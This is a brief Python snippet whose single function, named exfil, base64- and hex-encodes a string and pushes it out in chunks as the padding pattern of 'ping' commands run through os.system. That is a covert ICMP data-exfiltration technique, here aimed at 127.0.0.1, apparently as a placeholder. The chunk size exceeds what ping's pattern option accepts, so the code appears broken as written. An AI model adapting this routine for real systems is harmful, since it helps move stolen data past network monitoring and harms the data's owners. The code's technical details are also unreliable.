import base64
import os


def exfil(data):
    encoded = base64.b64encode(data.encode()).decode()
    for i in range(0, len(encoded), 200):
        chunk = encoded[i : i + 200]
        cmd = f'ping -c 1 -p {chunk.encode("utf-8").hex()} 127.0.0.1 > /dev/null'
        os.system(cmd)
